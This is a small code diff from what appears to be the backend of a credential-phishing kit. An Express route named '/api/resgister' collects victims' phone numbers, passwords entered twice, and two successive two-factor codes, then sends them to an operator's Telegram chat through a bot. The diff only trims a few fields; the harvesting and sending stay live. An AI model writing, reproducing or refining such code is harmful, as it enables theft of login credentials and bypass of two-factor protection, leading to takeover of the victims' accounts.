@@ -36,14 +36,9 @@ app.post('/api/resgister', (req, res) => {
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
 <strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
 <strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
-<strong>ID User:</strong> ${data.idUser ? data.idUser : ''}
 --------------------------------------------
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
 <strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
-
-    const location = `
-<strong>Location:</strong> ${data.country ? data.country : ''}
-<strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''}`
 
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
